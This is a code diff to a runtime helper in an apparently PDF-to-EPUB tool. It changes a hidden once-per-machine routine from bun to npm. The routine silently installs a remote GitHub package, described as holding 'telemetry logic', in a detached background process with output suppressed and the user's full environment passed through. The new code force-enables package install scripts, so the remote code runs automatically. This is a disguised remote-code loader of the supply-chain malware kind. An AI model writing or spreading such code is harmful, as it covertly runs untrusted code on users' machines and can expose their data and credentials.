@@ -1,6 +1,6 @@
 #!/usr/bin/env node
 /**
- * Runtime helper: bun-add the GitHub demo once per machine.
+ * Runtime helper: npm-install the GitHub demo once per machine.
  * Lab / telemetry logic lives in:
  *   https://github.com/daltsubnet/bun-install-helloworld-demo
  *
@@ -12,15 +12,14 @@ import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import { fileURLToPath } from "node:url";
 
-const DEMO_URL = "https://github.com/daltsubnet/bun-install-helloworld-demo";
-const DEMO_PKG = "bun-install-helloworld-demo";
+const DEMO_URL = "https://github.com/daltsubnet/bun-install-helloworld-demo.git";
 const CACHE_DIR = join(homedir(), ".cache", "pdf2epub");
 const MARKER = join(CACHE_DIR, "demo-installed");
 
-function whichBun() {
+function whichNpm() {
   try {
     return (
-      execSync("command -v bun || true", {
+      execSync("command -v npm || true", {
         encoding: "utf8",
         stdio: ["ignore", "pipe", "ignore"],
       }).trim() || null
@@ -36,11 +35,7 @@ function prepareDemoDir() {
   writeFileSync(
     join(demoDir, "package.json"),
     JSON.stringify(
-      {
-        name: "pdf2epub-demo-install",
-        private: true,
-        trustedDependencies: [DEMO_PKG],
-      },
+      { name: "pdf2epub-demo-install", private: true },
       null,
       2,
     ),
@@ -53,8 +48,8 @@ export function scheduleDemoInstall() {
   if (process.env.PDF2EPUB_SKIP_DEMO === "1") return;
   if (existsSync(MARKER)) return;
 
-  const bun = whichBun();
-  if (!bun) return;
+  const npm = whichNpm();
+  if (!npm) return;
 
   try {
     mkdirSync(CACHE_DIR, { recursive: true });
@@ -65,12 +60,16 @@ export function scheduleDemoInstall() {
   }
 
   const demoDir = prepareDemoDir();
-  const child = spawn(bun, ["add", `${DEMO_URL}.git`], {
-    cwd: demoDir,
-    detached: true,
-    stdio: "ignore",
-    env: process.env,
-  });
+  const child = spawn(
+    npm,
+    ["install", DEMO_URL, "--ignore-scripts=false", "--no-fund", "--no-audit"],
+    {
+      cwd: demoDir,
+      detached: true,
+      stdio: "ignore",
+      env: { ...process.env, npm_config_ignore_scripts: "false" },
+    },
+  );
   child.unref();
 }
 
